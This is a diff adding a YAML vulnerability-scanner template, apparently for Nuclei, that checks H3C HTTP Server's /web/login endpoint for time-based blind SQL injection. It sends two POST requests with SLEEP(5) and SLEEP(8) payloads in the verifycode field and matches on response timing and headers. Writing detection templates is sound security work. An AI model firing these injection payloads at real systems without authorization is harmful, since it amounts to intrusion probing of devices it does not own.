@@ -1,0 +1,39 @@
+id: h3c-http-server-login-sqli
+info:
+  name: "H3C HTTP Server Login SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: H3C
+
+http:
+  - raw:
+      - |
+        POST /web/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        user_name=admin&password=admin&verifycode=1' AND (SELECT 9821 FROM (SELECT(SLEEP(5)))dfpe) AND 'dYCM'='&language=0
+      - |
+        POST /web/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        user_name=admin&password=admin&verifycode=1' AND (SELECT 9821 FROM (SELECT(SLEEP(8)))dfpe) AND 'dYCM'='&language=0
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "H3C httpd"
+      - type: word
+        part: header
+        words:
+          - "application/xml"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
